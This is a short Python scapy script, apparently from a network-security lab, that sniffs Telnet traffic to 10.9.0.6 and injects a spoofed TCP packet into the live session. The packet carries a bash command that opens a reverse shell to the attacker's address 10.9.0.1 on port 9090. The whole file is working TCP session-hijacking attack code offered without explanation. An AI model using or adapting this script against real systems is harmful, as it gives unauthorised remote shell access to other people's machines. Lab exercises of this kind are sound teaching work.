#!usr/bin/env python3
from scapy.all import *

iface = 'br-efe15936ac80'
my_ip = "10.9.0.1"

def reverse_shell(pkt):

	src_ip = pkt[IP].src
	dst_ip = pkt[IP].dst
	src_port = pkt[TCP].sport
	dst_port = pkt[TCP].dport
	seq = pkt[TCP].seq
	ack = pkt[TCP].ack

	ip = IP(src=dst_ip, dst=src_ip)
	tcp = TCP(sport=dst_port, dport=src_port, flags="A", seq=seq, ack=ack)
	data = "\r/bin/bash -i > /dev/tcp/" + my_ip + "/9090 0<&1 2>&1\r"

	rst = ip/tcp/data
	send(rst, verbose=0, iface=iface)

def main():
	# Sniffing exchanged packets
	print('[💻 SNIFFING AND LAUNCHING REVERSE SHELL]')
	pkt = sniff(iface=iface, filter='tcp port 23 and host 10.9.0.6', prn=reverse_shell)

if __name__ == '__main__':
	main()